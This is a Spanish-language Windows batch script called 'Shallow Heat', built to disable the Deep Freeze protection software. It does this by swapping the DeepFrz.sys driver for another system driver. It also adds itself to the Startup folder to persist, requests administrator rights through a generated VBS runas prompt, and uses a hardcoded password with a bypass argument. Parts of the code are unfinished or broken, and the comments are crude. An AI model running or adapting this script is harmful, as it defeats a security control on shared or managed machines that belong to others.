@ECHO OFF
title Shallow Heat

IF --%2% EQU --NOPASSWORDADMINRIGHTS696969420!! (SET noBackup=1 && GOTO NOPSS)
SET /A intentos=0
:line0
IF %intentos% EQU 3 (
ECHO Ahora tenes una sorpresa...
DEL "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\aachitear.bat">NUL
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %~d0\BACKUP\big_brother.bmp /f
rundll32 user32.dll,UpdatePerUserSystemParameters
TIMEOUT /T 5 /NOBREAK>NUL
EXIT)
color cf
ECHO CONTRASENA REQUERIDA:
set /p contra=
IF NOT %contra% == cockingloco goto :FAIL
CLS

:NOPSS
::NO CALL :BACKUP! CREA LOOP DE SUBRUTINA!
::YACHITEADA VALORES:  0:  NO HAY DEEPFREZE, 1: DEEPFREEZE ESTA EN EL SISTEMA, 2: DEEPFREEZE  ESTA  APAGADO POR ESTE PROGRAMA

::SET DE VARIABLES
SET cockFolder=C:\Windows\System32\CockOLoco
SET pathDeep=C:\Windows\System32\drivers\DeepFrz.sys
SET pathThw=C:\Windows\System32\drivers\xboxgip.sys
SET pathAutoExec=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
SET debugMode=0

IF -%1%-==-- (goto newPc
) ELSE (SET PC=%1%
GOTO afterPc)

:newPc
SET /P PC=Enter the PC number:
:afterPc
call :time
SET pathLog="%~d0\BACKUP\%PC%\%currentDate%\log.txt"
IF NOT exist "%~d0\BACKUP\%PC%\%currentDate%\" (call :time && mkdir "%~d0\BACKUP\%PC%\%currentDate%\" && ECHO %logTime% **COMIENZO DEL LOG FILE PARA LA PC: %PC%**>>%pathLog% )

CALL :nomore
CALL :backup

:start
color F
ECHO NOMBRE DE LA PC ACTUAL:%PC%

IF %yachiteada% == 0 (
ECHO -------------------------------------------------
ECHO **NO SE ENCONTRO DEEPFREEZE - NO DEEPFRZ.SYS ENCONTRADO**
) ELSE IF %yachiteada% == 1 (
ECHO **COMPUTADORA FREEZEADA - NO DEEPFRZ.SYSOG DRIVER**
) else if %yachiteada% ==2 (
ECHO --------------------------------------------------
ECHO **LA PC ESTA DESFREEZEADA - DEEPFRZ IS NO MORE!!**
)

IF %noBackup% EQU 1 (
ECHO **SE NEGO LA CREACION DEL BACKUP, MAYBE YOUR BEST COURSE WOULD BE TO TREAT LIGHTLY**
ECHO -------------------------------------------------
) ELSE (
ECHO **HAY BACKUP PARA LA COMPUTADORA ACTUAL**
ECHO -------------------------------------------------)

ECHO Opciones de Shallow Heat:
ECHO.

ECHO anti. Realiza un cambio del modo congelado del sitema a descongelado.
ECHO pro. Revierte el cambio realizado por la opcion {anti}.
ECHO aso. Advanced Startup Options (Usted debera abrir la cmd manualmente y ejecutar este programa nuevamente).
ECHO new. Modificar el nombre de la computadora ingresado al programa.
ECHO cls. Limpia la pantalla
ECHO autodel. Desactiva iniciacion automatica del programa.
ECHO debug. **DEBUG** VOLVIO LA OPCION DEBUG!. **DEBUG**
IF %debugMode% EQU 1 (
ECHO.
ECHO ----------------------------------------------------
ECHO OPCIONES DE DEBUG -- DEVELOPER ONLY -- 
ECHO ----------------------------------------------------
ECHO **DEBUG ONLY** admin. Trata de conseguir permisos de administrador. **DEBUG ONLY**
ECHO **DEBUG ONLY** backup. Crea un Backup **DEBUG ONLY**
ECHO **DEBUG ONLY** Valor de pathAutoExec: %pathAutoExec% **DEBUG ONLY**
ECHO **DEBUG ONLY** Valor de ERRORLEVEL: "%errorlevel%" **DEBUG ONLY**
ECHO **DEBUG ONLY** Valor de pathLog: %pathLog% **DEBUG ONLY**
ECHO **DEBUG ONLY** Valor de yachiteada: %yachiteada% **DEBUG ONLY**
ECHO **DEBUG ONLY** Valor de errorlevel: %errorlevel% **DEBUG ONLY**
ECHO **DEBUG ONLY** Valor de noBackup: %noBackup% **DEBUG ONLY**
)
ECHO --------------------------------------------------

ECHO.
ECHO Para seleccionar una opcion escribe su nombre antes del punto.(Ejemplo: anti)
SET /P operation=Escriba la opcion que quieras (MAYUSCULAS/minusculas):


call :time && ECHO %logTime% Input: "%operation%".>>%pathLog%

:opciones
IF /I "%operation%" =="anti" CALL :anti
IF /I "%operation%" =="pro" CALL :pro 
IF /I "%operation%" =="aso" shutdown.exe /r /o /t 0 && goto start
IF /I "%operation%" =="clpc" goto newPc
IF /I "%operation%" =="backup" call :backup
IF /I "%operation%" =="debug" IF %debugMode% EQU 0 (SET debugMode=1 && cls && goto start) ELSE (SET debugMode=0 && cls && goto start)
IF /I "%operation%" =="autodel" call :autoDelete && exit
IF /I "%operation%" =="new" goto newPc
IF /I "%operation%" =="autostart" call :autoStart
IF /I "%operation%" =="exit" exit
IF /I "%operation%" =="cls" cls
IF /I "%operation%" =="admin" goto BatchGotAdmin
color 4
ECHO La opcion "%operation%" no existe..
pause
cls
GOTO start

:anti
IF %yachiteada% EQU 0 (ECHO La comptutadora no tiene deepfreeze. Cancelando... && EXIT /B)
IF %yachiteada% EQU 1 (
ECHO \\\\\\\\\\\\\\\\\ANTI/////////////////
ECHO.
ECHO F | XCOPY /F /Y /H /R "%pathDeep%" "%pathDeep%og"
ECHO F | XCOPY /F /Y /H /R "%pathThw%" "%pathDeep%"
CALL :autoStart
::IF %ERRORLEVEL% EQU 0 CALL :autoStart && mkdir "C:\Windows\System32\CockOLoco" && call :time && ECHO %logTime% ANTIDEEPFRZ ejecutado correctamente. ERRORLEVEL="%errorlevel%">>%pathLog%
::IF %ERRORLEVEL% NEQ 0 call :time && ECHO %logTime% ERROR ANTIDEEPFRZ. ERRORLEVEL="%errorlevel%" >>%pathLog%
::XCOPY ERRORES VAN DE 1 AL 4, DOCUMENTACION EN OTRO COMENTARIO !!
ECHO.
ECHO \\\\\\\\\\\\\\\\\ANTI/////////////////
EXIT /B
)

:pro
if %yachiteada% EQU 2 (
	ECHO \\\\\\\\\\\\\\\\\PRO/////////////////
	ECHO.
	DEL "%pathDeep%"
	call :time && ECHO DeepFrz.sys falso eliminado >>%pathLog%
	ECHO F | XCOPY /F /Y /H /R "%pathDeep%og" "%pathDeep%"
	DEL "%pathDeep%og"
	CALL :autoDelete
	MSG /TIME:5 * Reinicia ya la computadora. Mentira ya la reinicio yo
	shutdown /r /t 0
	ECHO.
	ECHO \\\\\\\\\\\\\\\\\PRO/////////////////
	exit /B
) IF %yachiteada% EQU 1(
	ECHO \\\\\\\\\\\\\\\\\PRO/////////////////
	ECHO.
	ECHO ERROR FILE %pathDeep%og DOESN'T EXIST ERRORLEVEL=%errorlevel%
	CALL :time && ECHO %pathLog% ERROR FILE %pathDeep%og DOESN'T EXIST ERRORLEVEL=%errorlevel% >>%pathLog%
	ECHO.
	ECHO \\\\\\\\\\\\\\\\\PRO/////////////////
    exit /B
) ELSE (
EXIT /B



::Funciones
:time
set "$time=%time: =0%"
SET currentDate=%date:~-4,4%%date:~-10,2%%date:~-7,2%
SET currentTime=%$time:~0,8%
SET logTime=%date:~4% %currentTime%
exit /B

:backup
IF -%noBackup% EQU -1 (EXIT /B)
SET /P bckOption=Desea hacer un backup de los archivos a modificar? (S/N)
cls
IF /I %bckOption% EQU n (SET noBackup=1 && exit /b)
ECHO.
ECHO **PROCESO DE BACKUP**
ECHO.
CALL :time
ECHO F | XCOPY /F /Y /H /R "%pathDeep%" "%~d0\BACKUP\%PC%\%currentDate%\DeepFrz.sys">NUL
ECHO F | XCOPY /F /Y /H /R "%pathThw%" "%~d0\BACKUP\%PC%\%currentDate%\xboxgip.sys">NUL
ECHO F | XCOPY /F /Y /H /R "%pathPersi%" "%~d0\BACKUP\%PC%\%currentDate%\Persi1.sys">NUL
ECHO.
ECHO **PROCESO DE BACKUP**
ECHO.
IF %ERRORLEVEL% EQU 0 (call :time && ECHO %logTime% **BACKUP HECHO**>>%pathLog%)
IF %ERRORLEVEL% NEQ 0 (call :time && ECHO %logTime% **ERROR BACKUP.** ERRORLEVEL="%errorlevel%" >>%pathLog%)
exit /B
::!!DOCUMENTAICON XCOPY - ERROR LEVEL CADA UNO NECESITA IF DISTINTOS, HACER CON FOR -- for %%e in (5 4 3 2 1) do if errorlevel %%e goto reason-%%e

::Verifica si la computadora esta freezeada o no.
::!!!ARREGLAR "!!!!
:nomore
IF exist "%pathDeep%og" (
SET yachiteada=2
call :time
ECHO %logTime% Se encontraron pruebas del programa.>>%pathLog%
goto BatchGotAdmin
)
IF NOT EXIST "%pathDeep%"  (
SET yachiteada=0
ECHO %logTime% DeepFreeze no fue encontrado.>>%pathLog%
EXIT /B
)
IF NOT EXIST "%pathDeep%og" (
SET yachiteada=1
ECHO %logTime% La computadora tiene DeepFreeze sin modificar por el programa.>>%pathLog%
exit /b
)



:autoStart
COPY "%~d0\aachitear.bat" "%pathAutoExec%\aachitear.bat"
call :time && ECHO %logTime% Programa copiado al inicio automatico.**>>%pathLog%
exit /B


:autoDelete
DEL "%pathAutoExec%\aachitear.bat"
call :time && ECHO %logTime% El programa fue eliminado del incio automatico.>>%pathLog%
exit /B


:FAIL
if %intentos% lss 3 (
  set /a intentos+=1
  goto :LINE0
)
EXIT

:automatic
SET /P autoAsk=Quiere que el programa haga todo por usted (Y/N)?
IF "%autoAsk%" EQU Y (echo hola)
if /i "%SAFEBOOT_OPTION%"=="MINIMAL" (echo pija)

IF autoAsk EQU Y (
SET autoMode=1
FOR 

)


:BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/k ""%~s0"" %PC% NOPASSWORDADMINRIGHTS696969420!!", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0" 

::--------------------------------------  